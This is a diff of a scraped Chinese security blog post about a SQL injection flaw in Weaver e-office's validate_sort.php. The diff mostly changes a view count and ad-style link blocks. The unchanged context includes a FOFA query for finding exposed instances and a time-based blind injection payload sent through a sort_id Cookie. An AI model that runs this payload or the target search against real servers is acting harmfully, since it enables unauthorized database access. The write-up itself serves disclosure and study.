@@ -7,17 +7,17 @@ asset_dir: assets/泛微e-office-validate_sort.php-sql注入漏洞
 # 泛微e-office validate\_sort.php sql注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/3/12 18:25
-- 813浏览
+- 815浏览
 - [0评论](#comment)
 - 16分钟阅读
 
 深入探索
 
-云安全解决方案
+在线安全工具
 
-网络安全会议
+漏洞扫描服务
 
-服务器安全服务
+企业安全咨询
 
 ---
 
@@ -36,6 +36,14 @@ e-office <=9.5
 > `app="泛微-EOffice"`
 
 # 漏洞分析
+
+深入探索
+
+文件大小转换
+
+JSON处理工具
+
+Windows安全工具
 
 general/officeitem/sort/validate\_sort.php 业务逻辑如下
 
@@ -60,6 +68,14 @@ if ( $row = mysql_fetch_row( $cursor ) )
 ?>
 ```
 
+深入探索
+
+网络安全培训
+
+编程语言教程
+
+计算机安全
+
 `sort_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
 # 漏洞复现
@@ -74,15 +90,15 @@ Cookie: sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
 
 成功延时 5 秒
 
-漏洞扫描服务
+漏洞修复方案
 
 深入探索
 
-Web安全课程
+云安全解决方案
 
-授权
+Nessus
 
-在线安全工具
+服务器安全服务
 
 [sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 结果如下
 
